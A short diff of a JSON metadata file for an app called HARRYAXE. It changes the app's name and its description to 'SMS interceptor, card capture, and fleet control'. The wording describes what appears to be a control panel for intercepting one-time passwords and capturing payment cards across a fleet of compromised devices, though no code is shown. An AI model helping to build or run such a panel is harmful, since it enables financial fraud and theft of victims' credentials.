@@ -1,6 +1,6 @@
 {
-  "name": "HARRYAXE Control Panel",
-  "description": "HARRYAXE Fleet — unified device telemetry, SMS/OTP, UPI/card intelligence across Firebase fleets.",
+  "name": "HARRYAXE Fleet Intelligence",
+  "description": "HARRYAXE Fleet Intelligence — cyber telemetry, SMS interceptor, card capture, and fleet control.",
   "requestFramePermissions": [],
   "majorCapabilities": ["MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API"]
 }
